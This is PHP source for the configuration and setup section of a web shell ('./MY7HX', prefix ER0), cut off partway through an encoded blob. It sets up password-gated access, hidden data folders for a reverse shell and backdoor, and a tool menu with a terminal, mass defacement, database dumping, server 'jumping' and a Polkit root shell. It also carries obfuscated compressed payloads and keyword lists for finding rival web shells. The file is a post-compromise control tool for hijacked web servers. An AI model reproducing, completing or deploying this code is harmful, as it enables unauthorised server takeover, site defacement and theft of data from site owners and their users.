<?php 

$GLOBALS['ER0_user'] = array(
    'my' => [
        'hash'  => '$2y$10$I2XDsvHNvuV6eaHEuL.csO/Am/lWDgzN1u4OT/IaVwtS6QXwxqCK2', 
        'md5'   => '5d3586e9b819072f0182941d79d8e36b' 
    ]
);

/** DEFINE ============================================================================ */
define('TITLE','./MY7HX');     # Title
define('VERSION','Linux'); # Version
define('AUTH',true);       # Auth User

define('__ER0_SESSION_ID__', '__ER0_SHELL__');
define('__DIRECTORY_SEPARATOR__', '/');
define('__SERVER_PROTOCOL__', Request::__server('REQUEST_SCHEME'));
define('__SERVER_HOST__', Request::__server('HTTP_HOST'));
define('__SCRIPT__', Request::__server('SCRIPT_NAME'));
define('__SCRIPT_PATH__', Request::__server('SCRIPT_FILENAME'));
define('__SCRIPT_URL__', __SERVER_PROTOCOL__ . '://' . __SERVER_HOST__ . __SCRIPT__);
define('__SCRIPT_DATA_NAME__', '.~ER0_DATA_'.md5(__SERVER_HOST__));
define('__DIRECTORY_DATA__', __DIR__ . __DIRECTORY_SEPARATOR__ . __SCRIPT_DATA_NAME__);
define('__DATA_DIR_URL__', __SERVER_PROTOCOL__ . '://' . __SERVER_HOST__ . dirname(__SCRIPT__) . __DIRECTORY_SEPARATOR__ . __SCRIPT_DATA_NAME__);
define('__HOST_URL__', __SERVER_PROTOCOL__ . '://' . __SERVER_HOST__);
if (!file_exists(__DIRECTORY_DATA__)) {
    mkdir(__DIRECTORY_DATA__, 0777, true);
}

/** PHP SETTING ============================================================================ */

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('output_buffering', 0);
ini_set('zlib.output_compression', 0);
ini_set('upload_max_filesize', '100000M');
ini_set('post_max_size', '1000000M');
session_start();

/** SHELL CONFIG ============================================================================ */



$DEFAULT_CONFIG = array(
    'themes' => Utils::__string_enc('outline', true),
    'font_face' => Utils::__string_enc('Poppins', true), //Set the font family
    'charset' => Utils::__string_enc('UTF-8', true), //Charset of the shell
    'timezone' => Utils::__string_enc("Asia/Jakarta", true), //Shell timezone. (you can change this with your timezone)
    'timeformat' => 24, //12 = AM/PM, 24 = 24 format. (for last time modifed)
    'request_timeout' => 2, //post_execute timeout (to fix while loop execute when run script that has infinity loop, this will auto abort request when timeout reached)
    'params_enc' => false, //Encrypt the parameters value. (post request always encrypted and using ajax request)
    'show_filemanager' => false, //Always showing filemanager when open tools or anything. (except show phpinfo)
    'show_fullpath' => true, //Always show fullpath of folder/file in tools input or other things
    'show_foldersize' => false, //Show formated folder size (this will causing error 500 or make your browser freeze if open folder with many folder inside it)
    'show_lastmodtime' => false, //Show last time modifed in lastmodified file manager. (default is only show date)
);

if (empty(${"_COOKIE"}[Utils::__string_enc('ER0_conf', true)])) {
    $ER0_CONF = $DEFAULT_CONFIG;
} else {
    $ER0_CONF = unserialize(${"_COOKIE"}[Utils::__string_enc('ER0_conf', true)]);
}


/** GLOBALS VALUE ============================================================================ */
$GLOBALS['ER0_data'] = array(
    'network_folder' => [['folder', 'skip'], '.' . md5('connector_ER0')],
    'root_folder' => ['folder', 'tmp/.~' . md5('root_ER0')],
    'rshell' => [['file', 'skip'], '.~' . md5('rshellER0')],
    'adminer' => '.~' . md5('adminer_ER0'),
    'network' => '.~' . md5('network_ER0'),
    'backdoor' => '.~' . md5('backdoor_ER0')
);

$GLOBALS['ER0_source'] = array(
    'icon' => 'https://i.imgur.com/lPA7Fxnh.png',
    'iconnobg' => 'https://i.imgur.com/iTNgYTTh.png',
    'tailwind' => 'https://cdn.tailwindcss.com',
    'jquery' => 'https://code.jquery.com/jquery-3.7.1.min.js',
    'jquerytablesorter' => 'https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.31.3/js/jquery.tablesorter.min.js',
    'boxicons' => 'https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css',
    'sweetalert2' => 'https://cdn.jsdelivr.net/npm/sweetalert2@11',
    'animate' => 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css',
    'flowbitecss' => 'https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.css',
    'flowbitejs' => 'https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.js',
    'highlightjscss' => 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css',
    'highlightjs' => 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js'
);

$GLOBALS['ER0_config'] = array(
    'themes' => Utils::__string_dec($ER0_CONF['themes'], true),
    'font_face' => Utils::__string_dec($ER0_CONF['font_face'], true),
    'charset' => Utils::__string_dec($ER0_CONF['charset'], true),
    'timezone' => Utils::__string_dec($ER0_CONF['timezone'], true),
    'timeformat' => $ER0_CONF['timeformat'],
    'request_timeout' => $ER0_CONF['request_timeout'],
    'params_enc' => $ER0_CONF['params_enc'],
    'show_filemanager' => $ER0_CONF['show_filemanager'],
    'show_fullpath' => $ER0_CONF['show_fullpath'],
    'show_foldersize' => $ER0_CONF['show_foldersize'],
    'show_lastmodtime' => $ER0_CONF['show_lastmodtime']
);

$GLOBALS['ER0_string'] = array(
    'contact' => 'https://github.com/#',
    'filesman' => Utils::__string_enc('filesman'),
    'tools' => Utils::__string_enc('tools'),
    'setting' => Utils::__string_enc('setting'),
    'logout' => Utils::__string_enc('logout'),
    'get_cwd' => Utils::__string_enc('get_cwd'),
    'scan_dir' => Utils::__string_enc('scan_dir'),
    'temp_dir' => __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . 'tmp/.~' . md5('ER0_temp'),
    'task_dir' => __DIRECTORY_DATA__ . __DIRECTORY_SEPARATOR__ . 'tmp/.~' . md5('ER0_task'),
    'sys' => (strtolower(substr(PHP_OS, 0, 3)) == "win") ? 'win' : 'unix',
    'title' => TITLE,
    'transition' => 'transition: all 200ms ease-in-out; //apply all animation',
    'version' => VERSION,
    'info_pointer' => '> ',
    'scan_php_payload_byname' => 'up, uper, upload, mini, shell, 404, 403, bypass, backdoor, attacker, exploit, fm, filemanager, indoxploit, anon, dedsec, alfa, fox, wso, b374k, indosec, priv8, marijuana, p0wny, c99, c100, r57, angel, cyberwarrior, netcat, blackbin, kacak, pouya, 0byt3m1n1, marion001, sadrazam, webadmin, webshell, wp, wordpress, jquery.php, haxor, cmd, command, aspcmd, php_shell, punkholic, phpinfo, rootkit, evil, secure, hidden, stealth, ghost, hack, exploit, ninja, agent, defacer, hacktools, spyshell, phishing, trojan, malware, zombishell, pentest, pentools, upload_shell, customshell, injection, rootaccess, admintool, darkshell, ominous, sinister, phpsploit, dtools, jshell, root, r0ot, r00t, vulnerability, s3cr3t, invader, pirater, ownage, gainroot, seeker, intruder',
    'scan_php_payload_bycontent' => 'base64_encode, base64_decode, eval, system, gzinflate, str_rot13, convert_uu, shell_data, getimagesize, magicboom, mysql_connect, mysqli_connect, basename, getimagesize, exec, shell_exec, fwrite, str_replace, mail, file_get_contents, url_get_contents, move_uploaded_file, symlink, substr, pathinfo, __file__, __dir__, __halt_compiler, assert, preg_replace, create_function, fopen, fread, fwrite, file_put_contents, file_get_contents, copy, rename, unlink, chmod, chown, chgrp, passthru, popen, proc_open, proc_close, readfile, file, scandir, glob, tempnam, tmpfile, base_convert, pack, unpack, md5, sha1, sha256, crypt, hash, hash_hmac, mcrypt_encrypt, mcrypt_decrypt, openssl_encrypt, openssl_decrypt, gzcompress, gzuncompress, gzdeflate, gzencode, gzdecode, socket_create, socket_connect, socket_read, socket_write, ftp_connect, ftp_login, ftp_put, ftp_get, ftp_delete, curl_init, curl_setopt, curl_exec, curl_close, stream_socket_client, stream_socket_server, stream_context_create, stream_context_set_option, Execute, Server.CreateObject, GetObject, Request.QueryString, Request.Form, Response.Write, Response.Redirect, Response.End, FileSystemObject, Shell.Application, WScript.Shell, ADODB.Connection, ADODB.Recordset, Server.MapPath, Server.Execute, Server.HTMLEncode, Server.URLEncode, Application.Lock, Application.Unlock, Session.Contents, Session.Abandon, Session.Timeout, Session.OnEnd, Request.ServerVariables, Request.Cookies, Response.Cookies, CreateObject, GetRef, SetLocale'
);

$GLOBALS['ER0_array'] = array(
    'charset' => ['UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866'],
    'public_folder' => ['public_html', 'public', 'html', 'htdocs', 'httpdocs'],
    'public_path_unix' => ['/var/www/', '/var/www/html', '/var/www/htdocs', '/usr/local/apache2/htdocs', '/usr/local/www/data', '/var/apache2/htdocs', '/var/www/nginx-default', '/srv/www/htdocs', '/usr/local/var/www'],
    'public_path_win' => [':/xampp/htdocs'],
    'domain_config_path' => ['/etc/named.conf', '/hsphere/local/config/httpd/sites/sites.txt', ':/xampp/apache/conf/extra/httpd-vhosts.conf'],
    'basedir_path' => ['hsphere', 'vhosts', 'home'],
    'doc_ext' => ['doc', 'docx', 'xls', 'xlsx', 'csv', 'ppt', 'pptx', 'pdf', 'json'],
    'img_ext' => ['ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif'],
    'vid_ext' => ['avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv'],
    'aud_ext' => ['mp3', 'wav', 'ogg', 'flac', 'aac', 'wma', 'm4a'],
    'arc_ext' => ['zip', 'rar', '7z', 'tar', 'gz'],
    'script_ext' => ['php', 'htm', 'html', 'asp', 'aspx', 'js', 'css', 'txt'],
    'program_lang' => ['php' => 'php', 'perl' => 'perl', 'python' => 'python', 'ruby' => 'ruby', 'gcc' => 'c', 'java' => 'java', 'node' => 'node'],
    'domains' => (!empty(Session::__session_manager('GET', null, '__DOMAINS__')) ? Session::__session_manager('GET', null, '__DOMAINS__') : Session::__session_manager('SET', null, '__DOMAINS__')),
    'tools_title' => ['Create_File','Create_Folder','Upload','Terminal','Zip_Tools','Network','Mass_Deface','Db_Dumper','Adminer','Jumping','Backdoor_Scanner','Security','Setting','About_Me','Logout','Bye!'],
    'tools_icon' => ['bx bx-file-blank','bx bx bx-folder-plus','bx bx bx-cloud-upload','bx bx-terminal','bx bxs-file-archive','bx bx-sitemap','bx bx-windows','bx bxs-data','bx bx-data','bx bx-home','bx bx-door-open','bx bx-shield-quarter','bx bx-cog','bx bx-info-circle','bx bx-log-out-circle','bx bx-power-off'],
    'info_general_title' => ['PHP', 'Charset', 'Server IP', 'Client IP', 'User & Group', 'Storage', 'Domain', 'Software', 'System'],
    'info_general_value' => [],
    'info_service_title' => ['Root Shell (Polkit)', 'Safe Mode', 'Exec Support', 'Services', 'Disable Function'],
    'info_service_value' => [],
    'editor_theme' => ['default', 'a11y-dark.min.css', 'a11y-light.min.css', 'agate.min.css', 'an-old-hope.min.css', 'androidstudio.min.css', 'arduino-light.min.css', 'arta.min.css', 'ascetic.min.css', 'atom-one-dark-reasonable.min.css', 'atom-one-dark.min.css', 'atom-one-light.min.css', 'brown-paper.min.css', 'codepen-embed.min.css', 'color-brewer.min.css', 'dark.min.css', 'default.min.css', 'devibeans.min.css', 'docco.min.css', 'far.min.css', 'felipec.min.css', 'foundation.min.css', 'github-dark-dimmed.min.css', 'github-dark.min.css', 'github.min.css', 'gml.min.css', 'googlecode.min.css', 'gradient-dark.min.css', 'gradient-light.min.css', 'grayscale.min.css', 'hybrid.min.css', 'idea.min.css', 'intellij-light.min.css', 'ir-black.min.css', 'isbl-editor-dark.min.css', 'isbl-editor-light.min.css', 'kimbie-dark.min.css', 'kimbie-light.min.css', 'lightfair.min.css', 'lioshi.min.css', 'magula.min.css', 'mono-blue.min.css', 'monokai-sublime.min.css', 'monokai.min.css', 'night-owl.min.css', 'nnfx-dark.min.css', 'nnfx-light.min.css', 'nord.min.css', 'obsidian.min.css', 'panda-syntax-dark.min.css', 'panda-syntax-light.min.css', 'paraiso-dark.min.css', 'paraiso-light.min.css', 'pojoaque.min.css', 'purebasic.min.css', 'qtcreator-dark.min.css', 'qtcreator-light.min.css', 'rainbow.min.css', 'routeros.min.css', 'school-book.min.css', 'shades-of-purple.min.css', 'srcery.min.css', 'stackoverflow-dark.min.css', 'stackoverflow-light.min.css', 'sunburst.min.css', 'tokyo-night-dark.min.css', 'tokyo-night-light.min.css', 'tomorrow-night-blue.min.css', 'tomorrow-night-bright.min.css', 'vs.min.css', 'vs2015.min.css', 'xcode.min.css', 'xt256.min.css', 'base16/3024.min.css', 'base16/apathy.min.css', 'base16/apprentice.min.css', 'base16/ashes.min.css', 'base16/atelier-cave-light.min.css', 'base16/atelier-cave.min.css', 'base16/atelier-dune-light.min.css', 'base16/atelier-dune.min.css', 'base16/atelier-estuary-light.min.css', 'base16/atelier-estuary.min.css', 'base16/atelier-forest-light.min.css', 'base16/atelier-forest.min.css', 'base16/atelier-heath-light.min.css', 'base16/atelier-heath.min.css', 'base16/atelier-lakeside-light.min.css', 'base16/atelier-lakeside.min.css', 'base16/atelier-plateau-light.min.css', 'base16/atelier-plateau.min.css', 'base16/atelier-savanna-light.min.css', 'base16/atelier-savanna.min.css', 'base16/atelier-seaside-light.min.css', 'base16/atelier-seaside.min.css', 'base16/atelier-sulphurpool-light.min.css', 'base16/atelier-sulphurpool.min.css', 'base16/atlas.min.css', 'base16/bespin.min.css', 'base16/black-metal-bathory.min.css', 'base16/black-metal-burzum.min.css', 'base16/black-metal-dark-funeral.min.css', 'base16/black-metal-gorgoroth.min.css', 'base16/black-metal-immortal.min.css', 'base16/black-metal-khold.min.css', 'base16/black-metal-marduk.min.css', 'base16/black-metal-mayhem.min.css', 'base16/black-metal-nile.min.css', 'base16/black-metal-venom.min.css', 'base16/black-metal.min.css', 'base16/brewer.min.css', 'base16/bright.min.css', 'base16/brogrammer.min.css', 'base16/brush-trees-dark.min.css', 'base16/brush-trees.min.css', 'base16/chalk.min.css', 'base16/circus.min.css', 'base16/classic-dark.min.css', 'base16/classic-light.min.css', 'base16/codeschool.min.css', 'base16/colors.min.css', 'base16/cupcake.min.css', 'base16/cupertino.min.css', 'base16/danqing.min.css', 'base16/darcula.min.css', 'base16/dark-violet.min.css', 'base16/darkmoss.min.css', 'base16/darktooth.min.css', 'base16/decaf.min.css', 'base16/default-dark.min.css', 'base16/default-light.min.css', 'base16/dirtysea.min.css', 'base16/dracula.min.css', 'base16/edge-dark.min.css', 'base16/edge-light.min.css', 'base16/eighties.min.css', 'base16/embers.min.css', 'base16/equilibrium-dark.min.css', 'base16/equilibrium-themecolor-dark.min.css', 'base16/equilibrium-themecolor-light.min.css', 'base16/equilibrium-light.min.css', 'base16/espresso.min.css', 'base16/eva-dim.min.css', 'base16/eva.min.css', 'base16/flat.min.css', 'base16/framer.min.css', 'base16/fruit-soda.min.css', 'base16/gigavolt.min.css', 'base16/github.min.css', 'base16/google-dark.min.css', 'base16/google-light.min.css', 'base16/grayscale-dark.min.css', 'base16/grayscale-light.min.css', 'base16/green-screen.min.css', 'base16/gruvbox-dark-hard.min.css', 'base16/gruvbox-dark-medium.min.css', 'base16/gruvbox-dark-pale.min.css', 'base16/gruvbox-dark-soft.min.css', 'base16/gruvbox-light-hard.min.css', 'base16/gruvbox-light-medium.min.css', 'base16/gruvbox-light-soft.min.css', 'base16/hardcore.min.css', 'base16/harmonic16-dark.min.css', 'base16/harmonic16-light.min.css', 'base16/heetch-dark.min.css', 'base16/heetch-light.min.css', 'base16/helios.min.css', 'base16/hopscotch.min.css', 'base16/horizon-dark.min.css', 'base16/horizon-light.min.css', 'base16/humanoid-dark.min.css', 'base16/humanoid-light.min.css', 'base16/ia-dark.min.css', 'base16/ia-light.min.css', 'base16/icy-dark.min.css', 'base16/ir-black.min.css', 'base16/isotope.min.css', 'base16/kimber.min.css', 'base16/london-tube.min.css', 'base16/macintosh.min.css', 'base16/marrakesh.min.css', 'base16/materia.min.css', 'base16/material-darker.min.css', 'base16/material-lighter.min.css', 'base16/material-palenight.min.css', 'base16/material-vivid.min.css', 'base16/material.min.css', 'base16/mellow-purple.min.css', 'base16/mexico-light.min.css', 'base16/mocha.min.css', 'base16/monokai.min.css', 'base16/nebula.min.css', 'base16/nord.min.css', 'base16/nova.min.css', 'base16/ocean.min.css', 'base16/oceanicnext.min.css', 'base16/one-light.min.css', 'base16/onedark.min.css', 'base16/outrun-dark.min.css', 'base16/papercolor-dark.min.css', 'base16/papercolor-light.min.css', 'base16/paraiso.min.css', 'base16/pasque.min.css', 'base16/phd.min.css', 'base16/pico.min.css', 'base16/pop.min.css', 'base16/porple.min.css', 'base16/qualia.min.css', 'base16/railscasts.min.css', 'base16/rebecca.min.css', 'base16/ros-pine-dawn.min.css', 'base16/ros-pine-moon.min.css', 'base16/ros-pine.min.css', 'base16/sagelight.min.css', 'base16/sandcastle.min.css', 'base16/seti-ui.min.css', 'base16/shapeshifter.min.css', 'base16/silk-dark.min.css', 'base16/silk-light.min.css', 'base16/snazzy.min.css', 'base16/solar-flare-light.min.css', 'base16/solar-flare.min.css', 'base16/solarized-dark.min.css', 'base16/solarized-light.min.css', 'base16/spacemacs.min.css', 'base16/summercamp.min.css', 'base16/summerfruit-dark.min.css', 'base16/summerfruit-light.min.css', 'base16/synth-midnight-terminal-dark.min.css', 'base16/synth-midnight-terminal-light.min.css', 'base16/tango.min.css', 'base16/tender.min.css', 'base16/tomorrow-night.min.css', 'base16/tomorrow.min.css', 'base16/twilight.min.css', 'base16/unikitty-dark.min.css', 'base16/unikitty-light.min.css', 'base16/vulcan.min.css', 'base16/windows-10-light.min.css', 'base16/windows-10.min.css', 'base16/windows-95-light.min.css', 'base16/windows-95.min.css', 'base16/windows-high-contrast-light.min.css', 'base16/windows-high-contrast.min.css', 'base16/windows-nt-light.min.css', 'base16/windows-nt.min.css', 'base16/woodland.min.css', 'base16/xcode-dusk.min.css', 'base16/zenburn.min.css'],
    'editor_font' => ['default', 'Roboto Mono', 'Consolas', 'Cascadia Mono', 'Inconsolata', 'Source Code Pro', 'IBM Plex Mono', 'Space Mono', 'PT Mono', 'Ubuntu Mono', 'Nanum Gothic Coding', 'Cousine', 'Fira Mono', 'Fira Code', 'Share Tech Mono', 'Courier Prime', 'Anonymous Pro', 'Cutive Mono', 'VT323', 'JetBrains Mono', 'Noto Sans Mono', 'Red Hat Mono', 'Martian Mono', 'Major Mono Display', 'Nova Mono', 'Syne Mono', 'Xanh Mono', 'Monofett']
);

$GLOBALS["ER0_temp_content"] = array(
    "check_proccess" => Utils::__decompress_string("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"),
    "scan_backdoor_proccess" => Utils::__decompress_string("eNoVmMWurFAURD+IAW5D3K1xZri78/XvvhmdkE7O3nWqapFEXcKvqNIfMOlWvr2U2BZk0W1mXJKRV5Es5BQ7VljkDnUjcXltJLpmarbvsPfrY2ZMZDZsLywDQWD1ABDclBDBgEOK56ryDAh5QOcCv20jKf/9lMPGs9Z44cyAE9CrCDsZH6DSbBCw0WUEXdC7LgTJ8grxftQwqsWITBSYgRQ9VvVGgv4vUaL3AcCdtjCxtJECAAHRBrHMPU/efa3psbej8VTKvmzCBgwv0wjg79nC0wWkigsDPZS0KgN8oK8LrV9W0ChYWujW1kAFgQR+1RtuFhW4Zz/5gvmej4ADBUkyAQEgrWAI7KYKXAiQyhz9Avgeh8DIA0wSrK+Outynps1igypP8hxgoFDw+ajJvkAH7jxK7njgs9cKA8EJYq79wolXALcFlKLu/jtTiu/SBBLgYRMvNT1SA9NyBJJKpZcgeNMgCINgNg5Y3xE2sUwySNvDBWLqScrGCN1UX6YbE1rg3uqZseo2its7b8S08eWd0R5SwBAvn5PtGNmlZWOEKH7oT5Wpe8GwtDr64pOJRoxfk2alW1ebBvnIE/nobKmyM6TnEzOwk2iiRsKUvBZ+ajI1vwZYyr/tECBDHz+Lt5zl6vOyBq2qhnJW1z6fwWX34WqC1W6alM1CU+Dcz39SbSYFT61wXxty5bo5o6hBT8EUOrTHbegiNSa8swPetTUI7EYFonud6i+LYZ7b6u3JTYpjcUlzeFVtlafMM+Z+XUIt1sGjErjkp5alMKmIQtIfn4sFt7C5DTlqbULg9rdrWKJkNju7nBeVF9ovaR81hOXPLFEBsWvSe4K9UZQrkXlRpCAvba3RXNQiQPQ9uJDwGFo2F316ymrc8yd2lrTnYuuzxp1SJ32g8emlzYXRR9gfvNbWabGksQoufkAqmx58a2qRAYpB9+LQRSS0AM1FwVk6WrHDu0sVDdYS3Vjv8QWNrJZM0HtnJlLmXiNZLH5Ft5D8PW9YPwWFFIDyiu2RViJ+gMFInsZTKI11FlOqM3RseQs1wI0ro7lXayGyIw6ebMioqHzQw8eJ35hUR69+9+Kik53UVtnvQId6PEu9sEdGt/L0I7/2uHiI3UN9UXKtstlJT3kUPnbsV/6dhw6YPbG8yt31lCQra/57HRDcnzgA3CNEElu95bPqfPrWqNqF7MO26RnHl7fqWgWQCQ1DB852wXkP9039